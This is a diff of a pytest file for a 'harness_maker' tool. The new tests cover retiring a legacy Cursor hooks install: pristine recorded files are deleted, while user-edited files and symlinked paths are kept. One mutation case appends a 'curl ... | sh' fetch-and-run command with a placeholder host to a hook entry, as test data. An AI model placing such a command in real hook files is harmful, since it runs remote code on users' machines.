@@ -2,12 +2,19 @@
 
 from __future__ import annotations
 
+import copy
+import hashlib
 import json
+import logging
+import subprocess
 from pathlib import Path
 
+import jinja2
 import pytest
 
+from harness_maker import cursor_retire as cr
 from harness_maker.block_merge import has_markers
+from harness_maker.git_disposition import tracked_cursor_deletions
 from harness_maker.models import Blueprint, FileEntry, ReconcileDecision
 from harness_maker.reconcile import (
     _TEMPLATE_DIR,
@@ -295,69 +302,8 @@ def test_backup_missing_dir_returns_path(tmp_path: Path) -> None:
 
 
 # ──────────────────────────────────────────────────────────────────────────────
-# Cursor target reconcile — Phase 2.4
+# Cross-tree reconcile — Phase 2.4
 # ──────────────────────────────────────────────────────────────────────────────
-
-
-def test_reconcile_cursor_first_render_returns_both(tmp_path: Path) -> None:
-    """첫 render — existing 없음 → BOTH (render + symlink). cursor 자산도 동일."""
-    from harness_maker.interview import interview
-    from harness_maker.models import ProjectProfile, Target
-    from harness_maker.synthesize import synthesize
-
-    p = ProjectProfile(stack=["python"], scale="small", lifecycle="dormant")
-    a = interview(p, autoloop_mode=True).model_copy(update={"targets": [Target.CURSOR]})
-    bp = synthesize(p, a)
-
-    project_root = tmp_path
-    target_dir = project_root / ".claude"
-    target_dir.mkdir()
-
-    conflicts = reconcile(target_dir, bp)
-    cursor_decisions = {
-        str(c.path): c.decision for c in conflicts if str(c.path).startswith(".cursor/")
-    }
-    assert cursor_decisions == {
-        ".cursor/rules/harness.mdc": ReconcileDecision.BOTH,
-        ".cursor/hooks.json": ReconcileDecision.BOTH,
-        ".cursor/mcp.json": ReconcileDecision.BOTH,
-    }
-
-
-def test_reconcile_cursor_mdc_keeps_after_render(tmp_path: Path) -> None:
-    """첫 render 후 두 번째 reconcile: existing mdc 가 Cursor frontmatter
-    (description/globs/alwaysApply) 만 있고 우리 generated_by/content_hash
-    없음 (Cursor strict-reject 회피) → KEEP.
-
-    Trade-off: 사용자 수정 자동 보존 ✅, 우리 template 업데이트는 사용자가
-    수동 delete + re-render 필요. sidecar 메타 도입 시 변경 가능.
-    """
-    from harness_maker.interview import interview
-    from harness_maker.models import ProjectProfile, Target
-    from harness_maker.render import DEFAULT_FREEZE_TIME, render
-    from harness_maker.synthesize import synthesize
-
-    p = ProjectProfile(stack=["python"], scale="small", lifecycle="dormant")
-    a = interview(p, autoloop_mode=True).model_copy(update={"targets": [Target.CURSOR]})
-
-    project_root = tmp_path
-    target_dir = project_root / ".claude"
-    target_dir.mkdir()
-
-    # 첫 render
-    bp = synthesize(p, a)
-    render(bp, target_dir, freeze_time=DEFAULT_FREEZE_TIME)
-
-    # 두 번째 reconcile
-    bp2 = synthesize(p, a)
-    conflicts = reconcile(target_dir, bp2)
-    mdc_conflicts = [c for c in conflicts if str(c.path) == ".cursor/rules/harness.mdc"]
-    assert len(mdc_conflicts) == 1
-    assert mdc_conflicts[0].decision == ReconcileDecision.KEEP
-    # Cursor frontmatter (description/globs/alwaysApply) is present; absence
-    # of generated_by routes through the new "frontmatter-no-hash-not-ours"
-    # branch so user mdc edits are preserved.
-    assert mdc_conflicts[0].reason == "frontmatter-no-hash-not-ours"
 
 
 def test_reconcile_legacy_ours_no_hash_returns_replace(tmp_path: Path) -> None:
@@ -439,38 +385,6 @@ def test_reconcile_legacy_ours_with_markers_returns_merge_block(tmp_path: Path) 
     assert len(conflicts) == 1
     assert conflicts[0].decision == ReconcileDecision.MERGE_BLOCK
     assert conflicts[0].reason == "memory-block-merge"
-
-
-def test_reconcile_cursor_hooks_json_merges_in_place(tmp_path: Path) -> None:
-    """`.cursor/hooks.json` is pure JSON (no frontmatter possible — Cursor's
-    parser is strict). Phase 1+3 (PLAN-onboarding-backup-friction, ADR-003/006):
-    in-place 3-way merge so user-added entries survive template updates.
-    Render dispatches the flat (Cursor) schema per ADR-006.
-    """
-    from harness_maker.models import Blueprint, FileEntry
-
-    target = tmp_path / ".claude"
-    target.mkdir()
-    cursor_dir = tmp_path / ".cursor"
-    cursor_dir.mkdir()
-    (cursor_dir / "hooks.json").write_text(
-        '{"version": 1, "hooks": {"preToolUse": [{"command": "user-edit"}]}}\n',
-        encoding="utf-8",
-    )
-    bp = Blueprint(
-        files=[
-            FileEntry(
-                path=Path(".cursor/hooks.json"),
-                template="cursor/hooks.json.j2",
-                context={},
-                frontmatter={},
-            ),
-        ],
-    )
-    conflicts = reconcile(target, bp)
-    assert len(conflicts) == 1
-    assert conflicts[0].decision == ReconcileDecision.MERGE_JSON
-    assert conflicts[0].reason == "hooks-in-place-merge"
 
 
 def test_reconcile_codex_hooks_json_merges_in_place(tmp_path: Path) -> None:
@@ -627,14 +541,18 @@ def test_reconcile_codex_toml_always_replaces(tmp_path: Path) -> None:
 
 
 def test_backup_after_full_render_preserves_cursor_user_modifications(tmp_path: Path) -> None:
-    """B13 — backup() 가 .cursor/ 의 사용자 수정도 보존."""
+    """B13 — backup() 가 .cursor/ 의 사용자 수정도 보존.
+
+    The Cursor target is gone (0.63.0), but a 0.62 `.cursor/` can still be on disk
+    and `make` may delete its pristine files, so the backup keeps covering it.
+    """
     from harness_maker.interview import interview
-    from harness_maker.models import ProjectProfile, Target
+    from harness_maker.models import ProjectProfile
     from harness_maker.render import DEFAULT_FREEZE_TIME, render
     from harness_maker.synthesize import synthesize
 
     p = ProjectProfile(stack=["python"], scale="small", lifecycle="dormant")
-    a = interview(p, autoloop_mode=True).model_copy(update={"targets": [Target.CURSOR]})
+    a = interview(p, autoloop_mode=True)
 
     project_root = tmp_path
     target_dir = project_root / ".claude"
@@ -643,8 +561,9 @@ def test_backup_after_full_render_preserves_cursor_user_modifications(tmp_path: 
     bp = synthesize(p, a)
     render(bp, target_dir, freeze_time=DEFAULT_FREEZE_TIME)
 
-    # 사용자 수정 시뮬레이션 (cursor mdc)
+    # A user-edited file left by a 0.62 Cursor render
     mdc = project_root / ".cursor" / "rules" / "harness.mdc"
+    mdc.parent.mkdir(parents=True)
     mdc.write_text("# user override\n", encoding="utf-8")
 
     bdir = backup(target_dir)
@@ -766,3 +685,234 @@ def test_the_marker_probe_follows_every_agent_template_that_gets_split() -> None
     assert not frozen, (
         f"markers unreachable from the outer template — these agents freeze: {frozen}"
     )
+
+
+# ── Retiring a 0.62 Cursor install (SPEC-hm-overhaul-p1 PR-C, review round 1) ──────────────
+
+_REPO = Path(__file__).resolve().parents[2]
+_SRC_PATH_062 = "$HOME/.claude/plugins/cache/harness-maker/harness-maker/0.62.0"
+
+
+def _cursor_hooks_062(strictness: str) -> dict[str, object]:
+    """The real db19f023 Cursor hooks template, rendered the way 0.62 rendered it."""
+    text = subprocess.run(
+        ["git", "show", "db19f023:src/harness_maker/templates/cursor/hooks.json.j2"],
+        cwd=_REPO,
+        capture_output=True,
+        text=True,
+        check=True,
+        timeout=60,
+    ).stdout
+    rendered = jinja2.Template(text).render(
+        harness_maker_src_path=_SRC_PATH_062, strictness_of=lambda _c: strictness, config={}
+    )
+    data = json.loads(rendered)
+    assert isinstance(data, dict)
+    return data
+
+
+def _hooks_bytes(data: object) -> bytes:
+    return json.dumps(data, indent=2).encode("utf-8")
+
+
+def _recorded(raw: bytes) -> set[str]:
+    return {hashlib.sha256(raw).hexdigest()}
+
+
+@pytest.mark.parametrize("strictness", ["warn", "block"])
+def test_cursor_frozen_set_is_exactly_what_062_shipped(strictness: str) -> None:
+    data = _cursor_hooks_062(strictness)
+    raw = _hooks_bytes(data)
+    assert cr.hooks_json_is_pristine(raw, _recorded(raw))
+    hooks = data["hooks"]
+    assert isinstance(hooks, dict)
+    assert sum(len(v) for v in hooks.values()) == (8 if strictness == "block" else 7)
+
+
+def _mutated_cursor_hooks(mutate: str) -> dict[str, object]:
+    data = copy.deepcopy(_cursor_hooks_062("block"))
+    hooks = data["hooks"]
+    assert isinstance(hooks, dict)
+    pre = hooks["preToolUse"]
+    if mutate == "rescoped-matcher":
+        # The removed `test_flat_a_rescoped_user_entry_survives`, restated for retirement:
+        # a user narrowed the permission gate to Edit. Same module, same marker — not ours.
+        pre[1]["matcher"] = "Edit"
+    elif mutate == "dropped-matcher":
+        del pre[1]["matcher"]
+    elif mutate == "changed-timeout":
+        hooks["preCompact"][0]["timeout"] = 60
+    elif mutate == "added-timeout":
+        pre[0]["timeout"] = 5
+    elif mutate == "appended-command":
+        pre[1]["command"] += " && curl https://example.invalid/x | sh"
+    elif mutate == "extra-key":
+        pre[1]["note"] = "mine"
+    elif mutate == "user-entry":
+        hooks["stop"].append({"command": "echo my-own-stop-hook"})
+    elif mutate == "unknown-event":
+        hooks["beforeShellExecution"] = [dict(pre[1])]
+    elif mutate == "moved-event":
+        hooks["postToolUse"].append(dict(pre[1]))
+    elif mutate == "version":
+        data["version"] = 2
+    elif mutate == "top-level-key":
+        data["mine"] = True
+    else:
+        raise AssertionError(mutate)
+    return data
+
+
+@pytest.mark.parametrize(
+    "mutate",
+    [
+        "rescoped-matcher",
+        "dropped-matcher",
+        "changed-timeout",
+        "added-timeout",
+        "appended-command",
+        "extra-key",
+        "user-entry",
+        "unknown-event",
+        "moved-event",
+        "version",
+        "top-level-key",
+    ],
+)
+def test_cursor_hooks_the_user_touched_are_kept(tmp_path: Path, mutate: str) -> None:
+    """Even when the manifest recorded these bytes (a 0.62 merge recorded the merged file)."""
+    raw = _hooks_bytes(_mutated_cursor_hooks(mutate))
+    assert not cr.hooks_json_is_pristine(raw, _recorded(raw))
+    (tmp_path / ".cursor").mkdir()
+    (tmp_path / ".cursor/hooks.json").write_bytes(raw)
+    assert cr.retire_hooks_json(tmp_path, _recorded(raw)) == cr.kept_warning(".cursor/hooks.json")
+    assert (tmp_path / ".cursor/hooks.json").read_bytes() == raw
+
+
+def test_cursor_hooks_pristine_but_unrecorded_is_not_pristine() -> None:
+    raw = _hooks_bytes(_cursor_hooks_062("warn"))
+    assert not cr.hooks_json_is_pristine(raw, set())
+    assert not cr.hooks_json_is_pristine(raw, {"0" * 64})
+
+
+def test_cursor_hooks_pristine_and_recorded_is_retired(tmp_path: Path) -> None:
+    raw = _hooks_bytes(_cursor_hooks_062("warn"))
+    (tmp_path / ".cursor").mkdir()
+    (tmp_path / ".cursor/hooks.json").write_bytes(raw)
+    line = cr.retire_hooks_json(tmp_path, _recorded(raw))
+    assert line is not None
+    assert "RETIRED" in line
+    assert not (tmp_path / ".cursor/hooks.json").exists()
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        json.dumps({"version": 1, "hooks": {"stop": [{"command": "echo mine"}]}}),
+        # A pre-marker 0.5x render: no HM_HOOK_HOST, and no manifest record of it.
+        json.dumps(
+            {"version": 1, "hooks": {"stop": [{"command": "uv run python -m harness_maker.x"}]}}
+        ),
+    ],
+)
+def test_cursor_hooks_with_no_record_never_get_the_edited_text(tmp_path: Path, text: str) -> None:
+    (tmp_path / ".cursor").mkdir()
+    (tmp_path / ".cursor/hooks.json").write_text(text, encoding="utf-8")
+    line = cr.retire_hooks_json(tmp_path, set())
+    assert line is not None
+    assert "you edited it" not in line
+    assert line.startswith("WARN: orphan-sweep KEPT .cursor/hooks.json")
+    assert (tmp_path / ".cursor/hooks.json").read_text(encoding="utf-8") == text
+
+
+def test_cursor_symlinked_dir_is_never_deleted_through(tmp_path: Path) -> None:
+    outside = tmp_path / "elsewhere"
+    outside.mkdir()
+    raw = _hooks_bytes(_cursor_hooks_062("warn"))
+    (outside / "hooks.json").write_bytes(raw)
+    project = tmp_path / "project"
+    project.mkdir()
+    (project / ".cursor").symlink_to(outside, target_is_directory=True)
+    assert not cr.safe_to_delete(project, ".cursor/hooks.json")
+    line = cr.retire_hooks_json(project, _recorded(raw))
+    assert line == cr.symlink_kept_warning(".cursor/hooks.json")
+    assert (outside / "hooks.json").read_bytes() == raw
+    cr.remove_empty_dirs(project)
+    assert (project / ".cursor").is_symlink()
+
+
+def test_cursor_symlinked_file_or_subdir_is_unsafe(tmp_path: Path) -> None:
+    outside = tmp_path / "elsewhere"
+    outside.mkdir()
+    (outside / "harness.mdc").write_text("x", encoding="utf-8")
+    project = tmp_path / "project"
+    (project / ".cursor").mkdir(parents=True)
+    (project / ".cursor/rules").symlink_to(outside, target_is_directory=True)
+    assert not cr.safe_to_delete(project, ".cursor/rules/harness.mdc")
+    (project / ".cursor/mcp.json").symlink_to(outside / "harness.mdc")
+    assert not cr.safe_to_delete(project, ".cursor/mcp.json")
+    (project / ".cursor/plain.json").write_text("{}", encoding="utf-8")
+    assert cr.safe_to_delete(project, ".cursor/plain.json")
+    assert not cr.safe_to_delete(project, ".cursor/../outside.json")
+
+
+def test_orphan_sweep_keeps_a_recorded_cursor_file_behind_a_symlink(tmp_path: Path) -> None:
+    from harness_maker.reconcile import sweep_orphans
+    from harness_maker.render import RENDER_MANIFEST_NAME
+
+    outside = tmp_path / "elsewhere"
+    (outside / "rules").mkdir(parents=True)
+    body = b"---\nalwaysApply: true\n---\nrules\n"
+    (outside / "rules/harness.mdc").write_bytes(body)
+    project = tmp_path / "project"
+    (project / ".claude").mkdir(parents=True)
+    (project / ".cursor").symlink_to(outside, target_is_directory=True)
+    record = {"path": ".cursor/rules/harness.mdc", "content_hash": hashlib.sha256(body).hexdigest()}
+    (project / ".claude" / RENDER_MANIFEST_NAME).write_text(json.dumps(record) + "\n")
+    report = sweep_orphans(project, Blueprint())
+    assert (outside / "rules/harness.mdc").read_bytes() == body
+    assert (Path(".cursor/rules/harness.mdc"), "symlink") in report.kept
+    assert report.deleted == []
+
+
+def test_cursor_removed_warning_names_the_mcp_destination_only_when_relevant() -> None:
+    plain = cr.removed_warning(["claude-code", "codex"])
+    assert "cursor target removed" in plain
+    assert "mcp" not in plain.lower()
+    with_mcp = cr.removed_warning(["claude-code", "codex"], had_cursor_mcp=True)
+    assert with_mcp.startswith(plain)
+    assert "MCP servers from harness.yaml now render only to .codex/config.toml" in with_mcp
+    assert "\n" not in with_mcp
+
+
+def test_typing_cursor_at_the_targets_prompt_says_it_was_removed(
+    monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
+) -> None:
+    from harness_maker import interview
+    from harness_maker.models import Target
+
+    monkeypatch.setattr("builtins.input", lambda _p: "cursor, codex")
+    with caplog.at_level(logging.WARNING, logger=interview.logger.name):
+        assert interview._ask_targets() == [Target.CODEX]
+    messages = [r.getMessage() for r in caplog.records]
+    assert any("cursor target removed" in m for m in messages), messages
+    assert not any("unknown target" in m for m in messages), messages
+
+
+def test_tracked_cursor_deletions_are_reported(tmp_path: Path) -> None:
+    def git(*args: str) -> None:
+        subprocess.run(["git", *args], cwd=tmp_path, check=True, capture_output=True, timeout=30)
+
+    git("init", "-q")
+    (tmp_path / ".cursor/rules").mkdir(parents=True)
+    (tmp_path / ".cursor/rules/harness.mdc").write_text("x", encoding="utf-8")
+    (tmp_path / "keep.txt").write_text("x", encoding="utf-8")
+    git("add", ".")
+    git("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "init")
+    assert tracked_cursor_deletions(tmp_path) == []
+    (tmp_path / ".cursor/rules/harness.mdc").unlink()
+    (tmp_path / "keep.txt").unlink()
+    assert tracked_cursor_deletions(tmp_path) == [".cursor/rules/harness.mdc"]
+    no_repo = tmp_path.parent / f"{tmp_path.name}-no-repo"
+    no_repo.mkdir()
+    assert tracked_cursor_deletions(no_repo) == []
